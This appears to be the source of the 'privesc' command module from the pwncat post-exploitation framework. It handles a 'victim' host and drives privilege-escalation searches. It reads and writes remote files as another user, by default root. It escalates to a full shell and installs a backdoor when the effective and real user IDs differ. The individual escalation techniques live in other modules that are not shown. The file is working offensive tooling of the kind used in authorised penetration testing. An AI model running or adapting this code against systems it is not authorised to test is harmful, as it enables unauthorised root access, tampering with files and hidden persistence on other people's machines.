#!/usr/bin/env python3
from typing import List, Callable

import pwncat
from pwncat.commands.base import (
    CommandDefinition,
    Complete,
    parameter,
    StoreConstOnce,
    StoreForAction,
)
from pwncat import util, privesc
from pwncat.util import State
from colorama import Fore
import argparse
import shutil
import sys


class Command(CommandDefinition):
    """ Attempt various privilege escalation methods. This command will attempt
    search for privilege escalation across all known modules. Privilege escalation
    routes can grant file read, file write or shell capabilities. The "escalate"
    mode will attempt to abuse any of these to gain a shell.

    Further, escalation and file read/write actions will attempt to escalate multiple
    times to reach the target user if possible, attempting all known escalation paths
    until one arrives at the target user. """

    def get_user_choices(self):
        """ Get a list of all users on the remote machine. This is used for
        parameter checking and tab completion of the "users" parameter below. """
        return list(pwncat.victim.users)

    PROG = "privesc"
    ARGS = {
        "--list,-l": parameter(
            Complete.NONE,
            action=StoreConstOnce,
            nargs=0,
            const="list",
            dest="action",
            help="Enumerate and list available privesc techniques",
        ),
        "--all,-a": parameter(
            Complete.NONE,
            action="store_const",
            dest="user",
            const=None,
            help="list escalations for all users",
        ),
        "--user,-u": parameter(
            Complete.CHOICES,
            default="root",
            choices=get_user_choices,
            metavar="USER",
            help="the user to gain privileges as",
        ),
        "--max-depth,-m": parameter(
            Complete.NONE,
            default=None,
            type=int,
            help="Maximum depth for the privesc search (default: no maximum)",
        ),
        "--read,-r": parameter(
            Complete.NONE,
            action=StoreConstOnce,
            nargs=0,
            const="read",
            dest="action",
            help="Attempt to read a remote file as the specified user",
        ),
        "--write,-w": parameter(
            Complete.NONE,
            action=StoreConstOnce,
            nargs=0,
            const="write",
            dest="action",
            help="Attempt to write a remote file as the specified user",
        ),
        "--path,-p": parameter(
            Complete.REMOTE_FILE,
            action=StoreForAction(["write", "read"]),
            help="Remote path for read or write actions",
        ),
        "--escalate,-e": parameter(
            Complete.NONE,
            action=StoreConstOnce,
            nargs=0,
            const="escalate",
            dest="action",
            help="Attempt to escalate to gain a full shell as the target user",
        ),
        "--data,-d": parameter(
            Complete.LOCAL_FILE,
            action=StoreForAction(["write"]),
            default=None,
            help="The local file to write to the remote file",
        ),
    }
    DEFAULTS = {"action": "list"}

    def run(self, args):

        if args.action == "list":
            techniques = pwncat.victim.privesc.search(args.user)
            if len(techniques) == 0:
                util.warn("no techniques found")
            else:
                for tech in techniques:
                    util.info(f" - {tech}")
        elif args.action == "read":
            if not args.path:
                self.parser.error("missing required argument: --path")
            try:
                read_pipe, chain = pwncat.victim.privesc.read_file(
                    args.path, args.user, args.max_depth
                )
                util.success("file successfully opened!")

                # Read the data from the pipe
                shutil.copyfileobj(read_pipe, sys.stdout.buffer)
                read_pipe.close()

                # Unwrap in case we had to privesc to get here
                pwncat.victim.privesc.unwrap(chain)

            except privesc.PrivescError as exc:
                util.error(f"read file failed: {exc}")
        elif args.action == "write":
            # Make sure the correct arguments are present
            if not args.path:
                self.parser.error("missing required argument: --path")
            if not args.data:
                self.parser.error("missing required argument: --data")

            # Read in the data file
            try:
                with open(args.data, "rb") as f:
                    data = f.read()
            except PermissionError:
                self.parser.error(f"no local permission to read: {args.data}")

            try:
                # Attempt to write the data to the remote file
                chain = pwncat.victim.privesc.write_file(
                    args.path, data, target_user=args.user, depth=args.max_depth,
                )
                pwncat.victim.privesc.unwrap(chain)
                util.success("file written successfully!")
            except privesc.PrivescError as exc:
                util.error(f"file write failed: {exc}")
        elif args.action == "escalate":
            try:
                chain = pwncat.victim.privesc.escalate(args.user, args.max_depth)

                ident = pwncat.victim.id
                backdoor = False
                if ident["euid"]["id"] == 0 and ident["uid"]["id"] != 0:
                    util.progress(
                        "EUID != UID. installing backdoor to complete privesc"
                    )
                    try:
                        pwncat.victim.privesc.add_backdoor()
                        backdoor = True
                    except privesc.PrivescError as exc:
                        util.warn(f"backdoor installation failed: {exc}")

                util.success("privilege escalation succeeded using:")
                for i, (technique, _) in enumerate(chain):
                    arrow = f"{Fore.YELLOW}\u2ba1{Fore.RESET} "
                    print(f"{(i+1)*' '}{arrow}{technique}")

                if backdoor:
                    print(
                        (
                            f"{(len(chain)+1)*' '}{arrow}"
                            f"{Fore.YELLOW}pwncat{Fore.RESET} backdoor"
                        )
                    )

                pwncat.victim.reset()
                pwncat.victim.state = State.RAW
            except privesc.PrivescError as exc:
                util.error(f"escalation failed: {exc}")
